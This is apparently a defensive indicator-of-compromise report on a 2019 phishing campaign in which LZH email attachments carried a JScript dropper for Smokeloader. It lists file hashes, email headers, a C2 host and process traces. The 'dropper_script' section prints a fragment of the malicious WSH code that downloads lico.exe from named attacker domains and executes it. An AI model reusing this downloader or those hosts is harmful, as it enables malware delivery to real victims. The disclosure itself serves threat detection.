@@ -1,0 +1,98 @@
+#IOC #OptiData #VR #pony #smokeloader #WSH #LZH
+
+https://pastebin.com/Z7zq0YkW
+
+previous contact:
+https://pastebin.com/b8PkhMyN
+https://pastebin.com/hkskwKvc
+https://pastebin.com/JmthzrL4
+https://pastebin.com/1scwT0f8
+https://pastebin.com/MP3kCSSh
+
+FAQ:
+https://radetskiy.wordpress.com/2018/10/19/ioc_smokeloader_111018/
+ 
+attack_vector
+--------------
+email attach (lzh) > js > WSH > GET 2 URL > AppData\Roaming\Microsoft\Windows\Templates\??????.exe
+
+email_headers
+--------------
+Received: from ds196.mirohost.net (ds196.mirohost.net [89.184.70.56])
+Received: from [185.143.147.204] (port=50240 helo=nat-204.utels.ua) by ds196.mirohost.net
+From: Мария Яковенко <buhg@martgroup.com.ua>
+Subject: рахунки Яковенко М.М.
+To: "user00" <user00@victim0.com>
+Reply-To: Мария Яковенко <buhg@martgroup.com.ua>
+Date: Wed, 27 Feb 2019 11:30:37 +0200
+
+files
+--------------
+SHA-256	d388d26267051b6036ec22035883c0d849e7495919b37a09c3d48a4af0094e18
+File name	По работе за февраль.lzh		[LHarc 1.x/ARX archive data [lh0]]
+File size	354.38 KB
+
+SHA-256	11682833800a3ff5e5984de31ecd2f46c53341bc813fbaa9b53af74548d4a03b
+File name	Распределение завхозов.ods		[OpenDocument Spreadsheet]
+File size	19.1 KB
+
+SHA-256	daa2443a7ff973346246d3d92260b8100bdca5054c179688d4df3d164edf4b6a
+File name	Pax. 18-201 - 27.02.2019p..js		[ASCII text, with very long lines]
+File size	335.18 KB
+
+SHA-256	77b488a1904fb2b143e62dd5eedffd487c9e2e451a78bd921b0f4295adafbe7b
+File name	lico.exe				[PE32 executable (GUI) Intel 80386, for MS Windows]
+File size	568.5 KB
+
+activity
+**************
+
+dropper_script: 
+wsh = new ActiveXObject("wscript.shell"); 
+path = wsh.SpecialFolders("templates")+"\\"+((Math.random()*999999)+9999|0)+".exe"; 
+HTTP.Open("GET", "http://pomulaniop.icu/iman/lico.exe", false); 
+else 
+HTTP.Open("GET", "http://umileniumkk.ru/iman/lico.exe", false); 
+Stream.SaveToFile(path, 2); Stream.Close(); wsh.exec(path); } }
+
+AppData\Roaming\Microsoft\Windows\Templates\??????.exe
+
+PL_SRC
+pomulaniop{.} icu/iman/lico.exe
+umileniumkk{.} ru/iman/lico.exe
+mileniumkk{.} ru/iman/lico.exe
+
+C2
+http://aviatorssm{.} bit/
+
+netwrk
+--------------
+89.223.29.17		pomulaniop{.} icu	GET /iman/lico.exe HTTP/1.1 	Mozilla/4.0 
+
+comp
+--------------
+wscript.exe	3084	TCP	localhost	49233	89.223.29.17	80	ESTABLISHED
+
+proc
+--------------
+C:\Windows\System32\WScript.exe" "C:\Users\operator\Desktop\Pax. 18-201 - 27.02.2019p..js
+C:\Users\operator\AppData\Roaming\Microsoft\Windows\Templates\126531.exe
+
+persist
+--------------
+n/a
+
+drop
+--------------
+C:\Users\operator\AppData\Roaming\Microsoft\Windows\Templates\126531.exe
+
+# # #
+https://www.virustotal.com/#/file/d388d26267051b6036ec22035883c0d849e7495919b37a09c3d48a4af0094e18/details
+https://www.virustotal.com/#/file/11682833800a3ff5e5984de31ecd2f46c53341bc813fbaa9b53af74548d4a03b/details
+https://www.virustotal.com/#/file/daa2443a7ff973346246d3d92260b8100bdca5054c179688d4df3d164edf4b6a/details
+https://www.virustotal.com/#/file/77b488a1904fb2b143e62dd5eedffd487c9e2e451a78bd921b0f4295adafbe7b/details
+https://analyze.intezer.com/#/analyses/e63b126a-9b53-43dc-a8bd-a8d8112a6f75
+
+VR
+
+@
